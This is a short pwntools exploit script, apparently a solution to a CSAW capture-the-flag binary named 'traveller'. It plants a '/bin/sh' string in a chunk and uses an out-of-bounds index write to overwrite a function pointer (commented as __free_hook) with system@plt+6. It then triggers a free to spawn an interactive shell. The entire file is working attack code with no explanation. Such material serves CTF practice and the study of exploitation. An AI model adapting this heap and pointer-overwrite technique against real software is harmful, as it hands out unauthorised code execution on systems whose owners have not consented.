from pwn import *

#r = remote("pwn.chal.csaw.io", 1003)

r = process('./traveller')

target = 0x601f30
__DT_JMPREL = 0x400578
trips = 0x6020c0

# special chunk
r.sendline('1')
r.sendline('3')
r.sendline('/bin/sh')

# overwrite __free_hook with (system@plt+6)
r.sendline('2')
r.sendline(str((target-trips)//8))
r.sendline(p64(0x400716))

# free something
r.recvuntil(">")
r.sendline('3')
r.sendline('0')

r.interactive()